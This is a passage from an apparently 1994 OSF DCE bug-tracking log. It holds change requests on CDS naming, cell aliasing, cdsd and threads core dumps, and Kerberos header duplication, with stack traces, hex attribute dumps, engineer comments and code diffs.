73\x2f\x6f\x3d\x6f\x73\x66\x2f\x6f\x75\x3d\x73\x79\x73\x65\x6e\x67\x2f\x6f\x75\x
3d\x64\x6f\x77\x6e\x00'} {CDR='\x01\x33\x64\x36\x61\x35\x66\x66\x34\x2d\x65\x62\
x38\x61\x2d\x31\x31\x63\x64\x2d\x39\x64\x36\x35\x2d\x30\x30\x30\x30\x63\x30\x33\
x35\x37\x31\x34\x37\x00\x2f\x2e\x2e\x2e\x2f\x63\x3d\x75\x73\x2f\x6f\x3d\x6f\x73\
x66\x2f\x6f\x75\x3d\x73\x79\x73\x65\x6e\x67\x2f\x6f\x75\x3d\x64\x6f\x77\x6e\x2f\
x64\x6f\x77\x6e\x5f\x63\x68\x00\x20\x20\x35\x36\x6e\x63\x61\x63\x6e\x5f\x69\x70\
x5f\x74\x63\x70\x3a\x31\x33\x30\x2e\x31\x30\x35\x2e\x31\x2e\x37\x35\x5b\x5d\x00\
x6e\x63\x61\x64\x67\x5f\x69\x!
 70\x5f\x75\x64\x70\x3a\x31\x33\x30\x2e\x31\x30\x35\x2e\x31\x2e\x37\x35\x5b\x5d\
x00'}
gdscp> show /c=us/o=osf/ou=syseng/cn=down -pretty
 1) /C=us/O=osf/OU=syseng/CN=down
    Object-Class : Organizational-Person
                 : Person
                 : Top
    Common-Name  : down
    Surname      : wang
    CDS-Cell     : \x33\x65\x66\x30\x66\x62\x38\x31\x2d\x65\x62\x38\x61\x2d\x31\
x31\x63\x64\x2d\x39\x64\x36\x35\x2d\x30\x30\x30\x30\x63\x30\x33\x35\x37\x31\x34\
x37\x00\x33\x65\x66\x30\x66\x62\x38\x31\x2d\x65\x62\x38\x61\x2d\x31\x31\x63\x64\
x2d\x39\x64\x36\x35\x2d\x30\x30\x30\x30\x63\x30\x33\x35\x37\x31\x34\x37\x00\x2f\
x2e\x2e\x2e\x2f\x63\x3d\x75\x73\x2f\x6f\x3d\x6f\x73\x66\x2f\x6f\x75\x3d\x73\x79\
x73\x65\x6e\x67\x2f\x6f\x75\x3d\x64\x6f\x77\x6e\x00
    CDS-Replica  : \x01\x33\x64\x36\x61\x35\x66\x66\x34\x2d\x65\x62\x38\x61\x2d\
x31\x31\x63\x64\x2d\x39\x64\x36\x35\x2d\x30\x30\x30\x30\x63\x30\x33\x35\x37\x31\
x34\x37\x00\x2f\x2e\x2e\x2e\x2f\x63\x3d\x75\x73\x2f\x6f\x3d\x6f\x73\x66\x2f\x6f\
x75\x3d\x73\x79\x73\x65\x6e\x67\x2f\x6f\x75\x3d\x64\x6f\x77\x6e\x2f\x64\x6f\x77\
x6e\x5f\x63\x68\x00\x20\x20\x35\x36\x6e\x63\x61\x63\x6e\x5f\x69\x70\x5f\x74\x63\
x70\x3a\x31\x33\x30\x2e\x31\x30\x35\x2e\x31\x2e\x37\x35\x5b\x5d\x00\x6e\x63\x61\
x64\x67\x5f\x69\x70\x5f\x75\x64\x70\x3a\x31\x33\x30\x2e\x31\x30\x35\x2e\x31\x2e\
x37\x35\x5b\x5d\x00

        Showing CDS-Cell and CDS-Replica in hex format does not help mcuh in
        seeing what is there.

[10/20/94 public]
I was able to reproduce this with binaries from NB1010 (BL22?).

[10/21/94 public]
You are right. If you use gdsditadm to display CDS Cell and Replica
you will get a correct CDS Replica but in CDS Cell only Namespace UUID
is displayed - Root dir UUID and Root dir name are not there.
The reason for this is OT 12389 - x500_str_to_cell (provided by CDS -
cds/library/x500_name_utils.c) doesn't work correctly.

The fix for your problem would be to integrate the functions
x500_str_to_cell and x500_str_to_replica into gdscp.
A workaround is to use gdsditadm.
If you need a fix for x500_str_to_cell (OT 12389) please give me a call -
I have fixed this in our environment.



CR Number                     : 12678
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : sys_closembx() does not return a value.
Reported Date                 : 10/20/94
Found in Baseline             : 1.1b24
Found Date                    : 10/20/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : cds/library/<platform>/cds_mbx.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/20/94 public]

sys_closembx() in cds/library/<platform>/cds_mbx.c does not return a value
yet there's a call in server/ta_adver.c that assigns the returned status to
a variable (that is not used). Either cast that call return to void (as it
is done for other calls to sys_closembx() in ta_adver.c) or have
sys_closembx() return a status or ...



CR Number                     : 12673
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : control
Short Description             : type mismatch in visit_cds.c
Reported Date                 : 10/19/94
Found in Baseline             : 1.1
Found Date                    : 10/19/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : visit_cds.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/19/94 public]

Here's the offending routine:

> /*
>  * Comparision routine for binary search off cds_attlist
>    */
> static int
> bs_cmp (
>     const void *arg1_p,
>     const void *arg2_p)
> {
>     const dns_opq_sname *lookingfor = arg1_p;
>     const attribute_descriptor_t *tableitem = arg2_p;
>     dns_opq_sname *p;
>     int code;
> 
>     /* Get name from table */
>     p = (dns_opq_sname *)tableitem->aname;
> 
>     /* compare names and return results */
>     code = dnsCmpSimple(lookingfor, p);
>     return(code);
> }

And a few necessary definitions.  From directory/cds/includes/dnsclerk_cds.h:

> #define dnsCmpSimple(a,b)               cdsCmpSimple(a,b)
> 
> #define dns_opq_sname_t cds_simple_name_t
> #define dns_opq_sname cds_simple_name_t

And from directory/cds/includes/cdsclerk.h:

> #define CDS_SNAME_MAX             257   /* Largest name */
> 
> typedef struct {
>         unsigned char   uc[CDS_SNAME_MAX];
> } cds_simple_name_t;
> 
> int 
> cdsCmpSimple (
>     cds_simple_name_t   *,
>     cds_simple_name_t   *);

dnsCmpSimple (a.k.a. cdsCmpSimple) expects to be passed two pointers to
variables of type dns_opq_sname (a.k.a. cds_simple_name_t).  Instead, as
the first argument it is being passed a pointer to a const variable of
type dns_opq_sname.  Most ANSI C compilers gripe about this (as they 
should), but compile it anyway; the compiler used by the customer
reporting this wouldn't compile it at all.  The simplest solution is to
cast the first argument ("lookingfor") as a non-const (dns_opq_sname *).

Here are the diffs:

*** visit_cds.c	Wed Oct 19 11:44:05 1994
--- visit_cds.c.fix	Wed Oct 19 17:22:23 1994
***************
*** 893,898 ****
      p = (dns_opq_sname *)tableitem->aname;
  
      /* compare names and return results */
!     code = dnsCmpSimple(lookingfor, p);
      return(code);
  }
--- 893,898 ----
      p = (dns_opq_sname *)tableitem->aname;
  
      /* compare names and return results */
!     code = dnsCmpSimple((dns_opq_sname *)lookingfor, p);
      return(code);
  }



CR Number                     : 12666
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cell aliasing
Short Description             : cellalias does not work
Reported Date                 : 10/19/94
Found in Baseline             : 1.1
Found Date                    : 10/19/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/19/94 public]

I foudn the problem with the latest build: BL 22.

I gave an A0 since I believe that this is supposed to work in 1.1. Adjust
accordingly if you wish. I hope someone can tell me that I did sth wrong.

I followed the example in the admin guide book about how to do
cell name aliasing and created an alias for the cell after I configured it
(it is on a 486, single machine cell):

/u0/opt/dcelocal  dcecp
dcecp> cellalias create /.../c=us/o=osf/ou=syseng/ou=down
dcecp> prin cat
/.../wang_11b22.cell.osf.org/nobody
/.../wang_11b22.cell.osf.org/root
/.../wang_11b22.cell.osf.org/daemon
/.../wang_11b22.cell.osf.org/sys
/.../wang_11b22.cell.osf.org/bin
/.../wang_11b22.cell.osf.org/uucp
/.../wang_11b22.cell.osf.org/who
/.../wang_11b22.cell.osf.org/mail
/.../wang_11b22.cell.osf.org/tcb
/.../wang_11b22.cell.osf.org/dce-ptgt
/.../wang_11b22.cell.osf.org/dce-rgy
/.../wang_11b22.cell.osf.org/cell_admin
/.../wang_11b22.cell.osf.org/krbtgt/wang_11b22.cell.osf.org
/.../wang_11b22.cell.osf.org/hosts/down/self
/.../wang_11b22.cell.osf.org/hosts/down/cds-server
/.../wang_11b22.cell.osf.org/pwd_strength
dcecp> cell show /.../wang_11b22.cell.osf.org
{secservers
 /.../wang_11b22.cell.osf.org/subsys/dce/sec/master}
{cdsservers 
 /.../wang_11b22.cell.osf.org/hosts/down}
{dtsservers 
 /.../wang_11b22.cell.osf.org/hosts/down}
{hosts
 /.../wang_11b22.cell.osf.org/hosts/down}
dcecp> cell show /.../c=us/o=osf/ou=syseng/ou=down
Error: Requested operation would result in lost connectivity to root directory
dcecp> exit

According to the admin guide, once "cellalias create " is done, among
other things, a new principal should be created. As can be seen
above, it is not there. Subsequent show cell comand still thinks that
I am trying to connect to a foreign cell.

The only thing that I can tell that did happen is that the alias was added
to the /opt/dcelcoal/dce_cf.db file and /opt/dcelcoal/etc/security/pe-site
file.

Oh, I was cell_admin and root.

Here is what the book says:

             Use a cellalias create operation to create a second
             name for your cell.  This operation creates a new cell
             principal in the registry service and performs a
             registry verify operation to ensure that all the
             replicas are up-to-date.  Next it creates a cell alias
             name in CDS by using the cdsalias object. Finally it
             performs a hostdata operation on each host in the cell,
             updating each dcelocal/dce_cf.db file and
             dcelocal/etc/security/pe_site file with the cell alias
             name. This last step can take a long time to complete
             in a cell with many hosts.

[10/19/94 public]
My guess is that you probably need the fix to CR 12585.  There was a bug
that there was a failure and state was cleaned up but not reported.  There
are also lots of other bugs already open against dcecp,cds, dced, whatever
that cell aliasing and hcells is currently broken and that we are trying to
fix as much as we can in the unintegrated tree.  It would be much more
helpful 36 hours before final bit freeze to ask before opening CR's.



CR Number                     : 12663
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : cdsd cores
Reported Date                 : 10/19/94
Found in Baseline             : 1.1b21
Found Date                    : 10/19/94
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/19/94 public]
I'm running a 3 machine cell (HP sec and CDS master). All machines are
loaded with bl21.

Since yesterday afternoon, cdsd will not come up, it cores with the
following trace:

 0 cdsCountSimple@libdce + 0x00000010 (0x2e63656c, 0x402b2458, 0x1, 0)
 1 names_count + 0x0000001c (0x2e63656c, 0x404beb1c, 0, 0x7af70280)
 2 name_in_cell_test + 0x0000012c (0x4035b030, 0x402b2208, 0x402f7c8e, 0x1)
 3 walktree_assist + 0x00000050 (0x402b20a8, 0x342d3038, 0x2d626566, 0x31316364)
 4 lookup_dir + 0x000004b8 (0x402b20a8, 0x3, 0x3, 0x4001adb4)
 5 walktree + 0x00000668 (0x402b1328, 0x8, 0x4, 0x404beaa0)
 6 ta_read_att + 0x00000154 (0x402b1328, 0x404beaa0, 0x8, 0)
 7 cds_ReadAttribute + 0x000001ec (0x400f3350, 0x402ae878, 0x402ae808, 0x402af0ae)
 8 op21_ssr + 0x00000218 (0x400f3350, 0x400f1d88, 0x402ae51c, 0x401610f0)
 9 rpc__cn_call_executor@libdce + 0x000007c8 (0x400f1d88, 0, 0, 0)
10 cthread_call_executor@libdce + 0x000002d4 (0x400ba850, 0x7af3a2b0, 0x4004a350, 0x12)
11 cma__thread_base@libdce + 0x0000021c (0x4004a350, 0, 0, 0)
12 cma__thread_start1@libdce + 0x0000004c (0x4004a350, 0, 0, 0)
13 cma__thread_start0@libdce + 0x00000008 (0x4004a350, 0, 0, 0)
[last line repeats forever]

I turned on svc debugging to level 9 for server and library. The debug
file is in /afs/dce.osf.org/project/dce/osf/rousseau .

[10/20/94 public]
Happened again last night. Janet say a possible munged preferred name
in the debug log from yesterday's failure so its going to Roger and
I'm making it a 0.

[10/20/94 public]
It seems that the cdsalias tests are causing cdsd to die. When cdsd died 
last night I was albe to restart it, but it was gone again this morning. 
I wasn't running anything overnight.

I don't know if this is related (or even a problem), but...

When I do a:
dcecp> dir modify -add {CDS_UpgradeTo 4.0}
dcecp> dir synch /.:

When I do the dir synch, the window that I started cdsd in displays the
following:
1994-10-20-11:28:24.075-04:00I73.786 cdsd(6013) ERROR cds server server_hcell_support.c 722 0x4004ace0
get_preferred_member: No cell alias detected.

NOTE: this does not cause cdsd to die, but it may be a hint as to what's wrong.



CR Number                     : 12656
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : thr
Subcomponent Name             : pthread_once
Short Description             : filewnr coredumps in threads
Reported Date                 : 10/18/94
Found in Baseline             : 1.1b21
Found Date                    : 10/18/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/18/94 public]

After running for many hours, the simple filewnr program used by the
dfs system tests coredumped with:

 0 kill@libc + 0x00000008 (hp-ux export stub)
 1 cma__abort_process@libdce + 0x000000a4 (0x6, 0, 0, 0x7b010ea8)
 2 cma__bugcheck@libdce + 0x0000048c (0x7af84b78, 0x7af84b48, 0x1, 0x46)
 3 cma__open_general@libdce + 0x00001964 (0x1, 0, 0x8, 0x4000a0d8)
 4 cma__init_thread_io@libdce + 0x00000358 (0x80, 0x7af77890, 0x4000a158, 0x2)
 5 cma__init_static@libdce + 0x00000550 (0, 0, 0, 0)
 6 pthread_once@libdce + 0x000000b4 (0x7afbac88, 0x7af63e5a, 0x7b012764, 0x7b01276c)
 7 sec_login_pvt_get_default_cont + 0x00000074 (0x7b03336c, 0x7b00d168, 0x7b00d164, 0x7b00d160)
 8 sec_login_get_current_context@ + 0x00000034 (0x7b033368, 0x7b03336c, 0x7b0331e8, 0x13)
 9 report_whoiam + 0x0000001c (0x40002520, 0x3, 0x400027c8, 0)

It is very possible that the ticket expired but I don't understand why the
coredump - do you? The test had experienced many "connection timed out" errors
by the time this occurred but I don't know of why there would be any correlation.

Also - the test had been running as the dce principal root, NOT the 
machine self principal, so I do not believe this is related to CR 12627.

[10/18/94 public]
The ticket expiring should have nothing to do with the above coredump.
sec_login_get_current_context() and sec_login_pvt_get_default_context() are
basically going to get the credential filename from the KRB5CCNAME environment
variable, then try to read the data from that file.  They do not perform
authenticated RPCs, so expirations should not cause change in behavior.
In fact, at the point where the above died, it's trying to do it's
pthread_once routine that sets up the storage for the default context.
NOTE:  That initialization routine never got called.  The process died in
CMA while trying to set up CMA initialization for a pthread_once call.
I really want to reassign this to threads, but it's too late in the game to
play pingpong with CRs anymore, so I just added JD to the CC list, to see if
he has any ideas on what might cause this (system resources?)...

[10/21/94 public]
Tag, you're it.
I checked the code for the above routines.  sec_login_get_current_context()
does *nothing* but call sec_login_pvt_get_default_context() and it does
nothing before calling pthread_once().  The core dump shows that the process
died in CMA threads initialization code below pthread_once() so the entire
problem listed here is really in threads, not security.  I've reassigned this
to Threads (sorry John, you're the only person I knew to assign it to over
there) and switched the CC list from thr to sec.

[10/21/94 public]
I missed this when you added me to the list. Sorry I could have sommented on
this then and saved you some checking. The reason for the core dump is a 
bugcheck failure. This is the cma equivalent of an assertion failure. In fact
I was planing to convert all of the bugcheck calls to assertions but the
servicability assertion mechanism uses threads. Now for the current problem,
the bugcheck routine should have written out a cma_dump.log file in the
same directory as the core file. That file would contain a one line description
of which check failed. If we see this again please check for the file. Gail
says she may not get a chance run the the failure scenario until mid next week. 
But the only bugcheck failures in cma__open_general are:

 1. The file descriptor was larger than the maximum allowed.
 2. An fstat on the file descriptor failed and the errno was not one of
       EBADF
       EIO
       ETIMEDOUT
       EOPNOTSUPP
       EINVAL
       ENOENT 
    those expected. 
 3. The fstat succeeded but the st_mode&S_IFMT field returned was not one of:
       S_IFCHR
       S_IFBLK
       S_IFDIR
       S_IFREG
       S_IFLNK
       0
       S_IFSOCK 
       S_IFIFO



CR Number                     : 12655
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : h, krb5/kdc
Short Description             : kdc_util.h near-duplication
Reported Date                 : 10/18/94
Found in Baseline             : 1.1
Found Date                    : 10/18/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : kdc_util.h
Sensitivity                   : public

[10/18/94 public]

There are two versions of kdc_util.h in the build tree--one in security/h
and a newer one in krb5/kdc which includes a TGS workaround to handle an
incompatibility between DCE and MIT Kerberos.  The two files are nearly
identical and should probably be consolidated into a single file.  Here 
are the diffs:


*** h/kdc_util.h	Wed Dec 15 13:34:52 1993
--- krb5/kdc/kdc_util.h	Wed Dec 15 13:35:17 1993
***************
*** 8,18 ****
  /*
   * HISTORY
   * $Log:	c012655,v $
# Revision 1.1  94/10/18  15:14:44  root
# new CR
# 
!  * Revision 1.1.2.2  1992/12/29  13:06:39  zeliff
!  * 	Embedding copyright notice
!  * 	[1992/12/28  20:14:23  zeliff]
   *
!  * Revision 1.1  1992/01/19  14:43:38  devrcs
   * 	Initial revision
   * 
   * $EndLog$
--- 8,27 ----
  /*
   * HISTORY
   * $Log:	c012655,v $
# Revision 1.1  94/10/18  15:14:44  root
# new CR
# 
!  * Revision 1.1.6.1  1993/10/14  20:02:23  sommerfeld
!  * 	Workaround MIT-DCE incompatibility in tgs request
!  * 	[1993/10/14  15:52:56  sommerfeld]
   *
!  * Revision 1.1.4.2  1992/12/29  14:18:26  zeliff
!  * 	Embedding copyright notice
!  * 	[1992/12/28  20:54:51  zeliff]
!  * 
!  * Revision 1.1.2.2  1992/05/28  20:59:19  sommerfeld
!  * 	[CR3650] Add prototype for krb5_add32_nowrap.
!  * 	Add ADD macro to call it.
!  * 	[1992/05/27  22:28:53  sommerfeld]
!  * 
!  * Revision 1.1  1992/01/19  14:54:29  devrcs
   * 	Initial revision
   * 
   * $EndLog$
***************
*** 27,35 ****
  **
  */
  /*
!  * $Source: /project/ot/dce/d01/d26/RCS/c012655,v $
!  * $Author: root $
!  * $Id: c012655,v 1.1 94/10/18 15:14:44 root Exp $
   *
   * Copyright 1990 by the Massachusetts Institute of Technology.
   *
--- 36,44 ----
  **
  */
  /*
!  * $Source: /project/ot/dce/d01/d26/RCS/c012655,v $
!  * $Author: root $
!  * $Id: c012655,v 1.1 94/10/18 15:14:44 root Exp $
   *
   * Copyright 1990 by the Massachusetts Institute of Technology.
   *
***************
*** 80,90 ****
--- 89,104 ----
  					   int));
  krb5_error_code kdc_process_tgs_req PROTOTYPE((krb5_kdc_req *,
  					       const krb5_fulladdr *,
+ 					       krb5_data *,
  					       krb5_tkt_authent **));
  
  krb5_error_code kdc_get_server_key PROTOTYPE((krb5_ticket *,
  					      krb5_keyblock **,
  					      krb5_kvno *));
+     
+ krb5_int32 krb5_add32_nowrap PROTOTYPE ((krb5_int32, krb5_int32));
+ #define ADD(x,y) krb5_add32_nowrap(x,y)
+     
  /* do_as_req.c */
  krb5_error_code process_as_req PROTOTYPE((krb5_kdc_req *,
  					  const krb5_fulladdr *,
***************
*** 93,98 ****
--- 107,113 ----
  /* do_tgs_req.c */
  krb5_error_code process_tgs_req PROTOTYPE((krb5_kdc_req *,
  					   const krb5_fulladdr *,
+ 					   krb5_data *,
  					   krb5_data ** ));
  /* dispatch.c */
  krb5_error_code dispatch PROTOTYPE((krb5_data *,
***************
*** 132,136 ****
  #define	min(a, b)	((a) < (b) ? (a) : (b))
  #define	max(a, b)	((a) > (b) ? (a) : (b))
  #endif
! 
  #endif /* __KRB5_KDC_UTIL__ */
--- 147,151 ----
  #define	min(a, b)	((a) < (b) ? (a) : (b))
  #define	max(a, b)	((a) > (b) ? (a) : (b))
  #endif
!     
  #endif /* __KRB5_KDC_UTIL__ */



CR Number                     : 12654
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : Should remove cellname commands in cdscp
Reported Date                 : 10/18/94
Found in Baseline             : 1.1b21
Found Date                    : 10/18/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/18/94 public]

It was decided that this should be OT'd with the enhancement here
rather than submitting this into the unintegrated tree.

Problem:
    When typing "help in cdscp, it currently lists the add and remove
    cellname commands.  These should be removed from the help text in
    src/directory/cds/includes/cds.sams.

    Also, we should functionally disable the invocation of the cdscp
    cellname commands by modifying the parse table,
    src/directory/cds/control/cds.cdt, to not accept them.

The changes to both files are listed below:

Diffs:

src/directory/cds/includes/cds.sams
-----------------------------------
8a9
new> # Remove cellname help commands in cdscp.
4840,4842d4840
old> add   cellname as alias\n
old> add   cellname as child\n
old> add   cellname as preferred\n
4873d4870
old> remove        cellname\n

src/directory/cds/control/cds.cdt
---------------------------------
10d9
new> ! Remove cellname commands.
189a189,213
old> ! /* ---------------------------------------- */
old> ! /* subparse for ADD/REMOVE CELLNAME command */
old> ! /* ---------------------------------------- */
old>
old> ! /* have seen ADD CELLNAME */
old>
old> ELEMENT addcell
old>     GOSUB nowildfullname CALL entity:0 NEXT
old>     GOSUB rootfullname   CALL entity:0 NEXT
old> ELEMENT *
old>     WORD as MIN 1 NEXT
old>     GOSUB addcellas SUCCESS
old> ELEMENT addcellas
old>     WORD preferred MIN 1 CALL set_func:ADDCELLPREFERCMD GOTO
shouldbeend
old>     WORD alias MIN 1 CALL set_func:ADDCELLALIASCMD GOTO shouldbeend
old>     WORD child MIN 1 CALL set_func:ADDCELLCHILDCMD GOTO shouldbeend
old>     WORD inherit MIN 1 CALL set_func:ADDCELLINHERITCMD GOTO
shouldbeend
old>
old> ! /* have seen REMOVE CELLNAME */
old>
old> ELEMENT remcell
old>     GOSUB nowildfullname CALL entity:0 NEXT
old> ELEMENT *
old>     FORCE CALL set_func:REMCELLCMD GOTO shouldbeend
old>
336a361
old>     WORD cellname      MIN 2 CALL cellent GOTO addcell
562a588
old>     WORD cellname      MIN 2 CALL cellent GOTO remcell



CR Number                     : 12646
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : svc_s_acl_* codes never used
Reported Date                 : 10/17/94
Found in Baseline             : 1.1b20
Found Date                    : 10/17/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dce/utils/svc/svc.sams
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/17/94 public]
The svc_s_acl_* status codes are never used and should be "removed" from
the sams file.  (Just these: svc_s_acl_corrupt, svc_s_acl_open_error,
svc_s_acl_read_error, svc_s_acl_write_error, I think).  You can't just
remove them, however.  Mark them "obsolete" so the codes that follow them
in the sams file will have the same numbers.



CR Number                     : 12644
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : threads message changes go in unintegrated
Reported Date                 : 10/17/94
Found in Baseline             : 1.1
Found Date                    : 10/17/94
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/17/94 public]
Threads isn't using servicability routing but the need to use a special
cma version of dce_error_inq_text that has been supplied by the servicability
folk. The changes needed to do this need to go in. The risk is low and Susan
has already approved the UHYP status. We always new this needed to go in I 
just overlooked the fact that an ot had not been created.

[10/27/94 public]
The include of dce.h by cma.h caused a small number of problems in other
files so these changes were yanked. These are the diff with the 1.1 code
on the tape to reinsert the code.

+++++++++++++++++++ Makefile ++++++++++++++++++++
9,17d8
< # Revision 1.2.33.3  94/10/21  13:43:01  jd
< # 	build cma_send_error.o.
< # 
< # Revision 1.2.33.2  1994/10/20  21:26:40  jd
< # 	messages
< #
< # Revision 1.2.32.2  94/09/08  9:02:38  jd
< # 	Removed generation and export of dcethdmac.h and dcethdsvc.h
< # 
21c12
< # 
---
> #
114,115d104
< 
< #
135c124
< 	dcethdmsg.o		cma_send_error.o \
---
> 	dcethdmsg.o	\
163,165c152,154
< SAMSFILES       = thd.sams
< SAMIDL_INCLUDES = dcethdmsg.h
< SAMS_TARGETS    = ${SAMIDL_INCLUDES} dcethd.cat  dcethdmsg.c
---
> SAMSFILES		= thd.sams
> SAMSFILES_INCLUDES	= dcethdmsg.h
> SAMS_TARGETS		= dcethdmsg.c
167d155
< 
192,193c180
< 		cma_kernel.h 	cma_defer.h		\
<                 cma_kernel.h    cma_defer.h             dcethdmsg.h     \
---
> 		cma_kernel.h 	cma_defer.h		dcethdmsg.h \
+++++++++++++++++++ cma_init.c ++++++++++++++++++++
14,22d13
<  * Revision 1.1.12.2  94/10/20  17:26:29  jd
<  * 	messages
<  * 
<  * Revision 1.1.11.3  94/09/08  9:01:53  jd
<  * 	Removed include of dcethdmac.h and dcethdsvc.h
<  * 
<  * Revision 1.1.11.2  1994/09/06  21:19:51  jd
<  * 	servicability
<  *
26c17
<  * 
---
>  *
249d239
< 
295,296d284
< #include <dce/dce_msg.h>
< #include <dce/dcethdmsg.h>
298d285
< 
472,473d458
< extern void cma__init_dce_errors(void);
< 
675d659
<     cma__init_dce_errors();
+++++++++++++++++++ exc_handling.c ++++++++++++++++++++
11,19d10
<  * Revision 1.1.8.2  94/10/20  17:26:45  jd
<  * 	messages
<  * 
<  * Revision 1.1.7.3  94/09/08  9:01:58  jd
<  * 	Removed include of dcethdmac.h and dcethdsvc.h
<  * 
<  * Revision 1.1.7.2  1994/09/06  21:20:23  jd
<  * 	servicability
<  *
23c14
<  * 
---
>  *
250,251c241
< 
< 
---
> 
262a253
> # include <cma_message.h>
283,286d273
< #include <dce/dce.h>
< #include <dce/dce_error.h>
< #include <dce/dcethdmsg.h>
< #include <cma_send_error.h>
288d274
< 
951c937,943
< exc_report (EXCEPTION	*exc) 
---
> exc_report
> #ifdef _EXC_PROTO_
> 	(EXCEPTION	*exc) 
> #else
> 	(exc)
> 	EXCEPTION	*exc;
> #endif
952a945,946
> #if _EXC_OS_ == _EXC__VMS
>     unsigned int	msgvec[6], *mvp, old;
953a948,987
> 
>     if (exc->status.ext.sentinel != exc_newexc_c)
> 	old = 1;
>     else
> 	old = 0;
> 
>     /*
>      * If it's an old-format exception structure, or a new one that doesn't
>      * have any argument list, then fake a message vector.
>      */
>     if (old || exc->status.ext.args == (unsigned int *)0) {
> 
> 	if (exc->kind == exc_kind_status_c) {
> 	    msgvec[0] = 1;
> 	    msgvec[1] = exc->status.status;
> 	    msgvec[2] = 0;
> 	    msgvec[3] = 0;
> 	    msgvec[4] = 0;
> 	    msgvec[5] = 0;
> 	    mvp = &msgvec[0];
> 	    }
> 	else {
> 	    msgvec[0] = 3;
> 	    msgvec[1] = exc_s_exception;
> 	    msgvec[2] = 1;
> 	    msgvec[3] = (int)exc->address.address;
> 	    mvp = &msgvec[0];
> 	    }
> 
> 	}
>     else
> 	mvp = exc->status.ext.args;
>     
>     sys$putmsg (mvp, 0, 0, 0);
>     }
> #else
> #if (_CMA_UNIX_TYPE != _CMA__SVR4 )
>     (void)fflush (stdout);		/* Flush output stream, first */
> #endif
> 
954a989,996
> # if _EXC_VENDOR_ == _EXC__APOLLO
>         status_$t st;
>         static char *msg = "Exception: ";
>         st.all = exc->status.status;
>         error_$print_name(st, msg, strlen(msg));
> # else
> 	unsigned char	buffer[256], *stuff;
> 	int		status, arg = 0, len;
955a998,1001
> 
> 	cma__int_sprintf ((char *)buffer, "Exception: ");
> 	stuff = &buffer[0] + cma__strlen ((char *)buffer);
> 
962,967c1008,1031
<             cma_send_errno(exc->status.status);
<         }
<         else {
<             cma_send_error(exc->status.status);
<         }
<     }
---
> 
> 	    if (exc->status.status < sys_nerr) {
> 		cma__int_sprintf (
> 			(char *)stuff,
> 			"%s",
> 			sys_errlist[exc->status.status]);
> 		status = 0;
> 		}
> 	    else {
> 		cma__error_inq_text (exc_s_unkstatus, stuff, &status);
> 		arg = exc->status.status;
> 		}
> 
> 	    }
> 	else {
> 	    cma__error_inq_text (exc->status.status, stuff, &status);
> 	    }
> 
> 	len = cma__strlen ((char *)buffer);
> 	buffer[len] = '\n';
> 	buffer[len+1] = (char)0;
> 	cma__int_fprintf (stderr, (char *)buffer, arg, 0);
> # endif
> 	}
969c1033,1051
<       cma_send_exception((unsigned long)exc->address.address);
---
> 	unsigned char	buffer[256], *stuff;
> 	int		status, len;
> 
> 
> 	cma__int_sprintf ((char *)buffer, "Exception: ");
